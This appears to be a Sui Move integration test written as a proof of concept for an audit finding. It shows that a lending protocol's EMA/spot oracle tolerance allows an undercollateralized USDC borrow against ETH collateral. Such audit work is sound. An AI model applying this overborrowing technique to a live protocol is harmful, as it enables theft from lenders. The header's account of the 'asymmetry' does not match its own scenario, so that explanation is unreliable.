// PoC for Report #009: Asymmetric EMA/Spot Deviation Check in Oracle
//
// Target: contracts/x_oracle/sources/entry_points/user.move:42-59
// Place in: contracts/protocol/tests/integration/test_cases/
// Run:   sui move test --filter poc_009
//
// PREREQUISITE: Apply the patch in poc_helper_x_oracle_divergent.move
//               (add update_price_divergent to x_oracle.move)
//
// Bug: get_price_with_check computes deviation as |ema - spot| / spot
//      in both directions. Because spot is always the denominator:
//      - When EMA > spot: deviation = (ema - spot) / spot
//      - When EMA < spot: deviation = (spot - ema) / spot
//
//      With 10% tolerance:
//      - EMA can be up to 110% of spot (10% above)
//      - EMA can be down to 90% of spot (only ~9.09% deviation from EMA itself)
//
//      This asymmetry means a borrower can have collateral valued 10% above spot
//      AND debt valued ~11.11% below spot, creating a ~22% phantom margin.
//
// Scenario:
//   Collateral (ETH): EMA = $1100, spot = $1000 → deviation 10% → passes
//   Debt (USDC): EMA = $0.90, spot = $1.00 → deviation 10% → passes
//   Borrow succeeds with $1100 collateral (EMA) vs $0.90 debt pricing (EMA)
//   Actual collateral value = $1000, actual debt cost = $1.00/USDC
//   Position is undercollateralized at spot prices
//
// Expected: test PASSES, proving the overborrowing is possible

#[test_only]
module protocol::poc_009_oracle_deviation_asymmetric {
    use sui::test_scenario;
    use sui::clock;

    use protocol::market_t::MainMarket;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use protocol::oracle_t;
    use protocol::open_obligation_t;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;

    const ADMIN: address = @0xAD;
    const BORROWER: address = @0xBB;

    /// Proves that the asymmetric oracle deviation tolerance allows
    /// a borrower to create a position that is undercollateralized
    /// at spot prices but passes the EMA-based safety check.
    ///
    /// The deviation formula |ema - spot| / spot uses spot as denominator
    /// in both directions, creating asymmetric tolerance:
    ///   - Collateral EMA 10% above spot → collateral overvalued
    ///   - Debt EMA 10% below spot → debt undervalued
    ///   - Combined phantom margin: ~22%
    #[test]
    fun test_asymmetric_deviation_allows_overborrowing() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        // Step 1: Init market
        let (admin_cap, app, mut market, coin_registry) =
            protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);
        let mut x_oracle = oracle_t::init_t(scenario);

        // Step 2: Set oracle prices with maximum allowed divergence
        // Both pass the 10% tolerance check (|ema - spot| / spot <= 0.10)
        clock.set_for_testing(100_000);

        // ETH: EMA = $1100, spot = $1000
        // Deviation = (1100 - 1000) / 1000 = 10% → passes
        // Protocol values collateral at EMA = $1100
        x_oracle.update_price_divergent<ETH>(
            &clock,
            oracle_t::calc_scaled_price(1000, 0),   // spot = $1000
            oracle_t::calc_scaled_price(1100, 0),    // ema = $1100
        );

        // USDC: EMA = $0.90, spot = $1.00
        // Deviation = (1.00 - 0.90) / 1.00 = 10% → passes
        // Protocol values debt at EMA = $0.90
        x_oracle.update_price_divergent<USDC>(
            &clock,
            oracle_t::calc_scaled_price(1, 0),       // spot = $1.00
            oracle_t::calc_scaled_price(9, 1),        // ema = $0.90 (9/10)
        );

        // Step 3: Borrower deposits 1 ETH
        scenario.next_tx(BORROWER);
        let borrower_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );
        let eth_amount = 1 * 10u64.pow(default_eth_decimal_places());
        let eth_coin = sui::coin::mint_for_testing<ETH>(eth_amount, scenario.ctx());
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &borrower_cap, eth_coin, &clock, scenario.ctx()
        );

        // Step 4: Borrow USDC
        //
        // At EMA prices:
        //   Collateral = 1 ETH * $1100 (EMA) = $1100
        //   Weighted collateral = $1100 * 70% CF = $770
        //   Can borrow up to $770 / $0.90 (EMA debt price) = 855.56 USDC
        //
        // At SPOT prices (reality):
        //   Collateral = 1 ETH * $1000 (spot) = $1000
        //   Weighted collateral = $1000 * 70% CF = $700
        //   Safe borrow limit = $700 / $1.00 (spot) = 700 USDC
        //
        // Borrow 800 USDC:
        //   EMA check: $800 * $0.90 = $720 < $770 → SAFE (passes)
        //   Spot check: $800 * $1.00 = $800 > $700 → UNSAFE (would fail)
        //
        // The borrow succeeds despite being undercollateralized at spot!

        scenario.next_tx(BORROWER);
        let borrow_amount = 800 * 10u64.pow(default_stable_decimal_places());
        let borrowed_usdc = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &borrower_cap, &mut market, &coin_registry,
            borrow_amount, &x_oracle, &clock, scenario.ctx()
        );

        // Step 5: Verify the borrow succeeded
        // If we reach here without abort, the overborrowing is confirmed
        let borrowed_value = borrowed_usdc.value();
        assert!(borrowed_value == borrow_amount, 0);  // Full 800 USDC borrowed

        // Step 6: Demonstrate the position is undercollateralized at spot
        //
        // If EMA converges to spot, the obligation becomes instantly unsafe:
        //   Collateral at spot = $1000, weighted = $700
        //   Debt at spot = $800
        //   $800 > $700 → undercollateralized → liquidatable
        //
        // The protocol issued a loan that was ALREADY undercollateralized
        // at spot prices, with the deviation check passing in both directions.
        //
        // Phantom margin exploited:
        //   EMA-based capacity: $855.56 USDC
        //   Spot-based capacity: $700 USDC
        //   Phantom margin: ($855.56 - $700) / $700 = 22.2%

        // Cleanup
        std::unit_test::destroy(borrowed_usdc);
        clock::destroy_for_testing(clock);
        test_scenario::return_shared(market);
        std::unit_test::destroy(admin_cap);
        std::unit_test::destroy(borrower_cap);
        std::unit_test::destroy(app);
        std::unit_test::destroy(x_oracle);
        std::unit_test::destroy(coin_registry);
        scenario_value.end();
    }
}
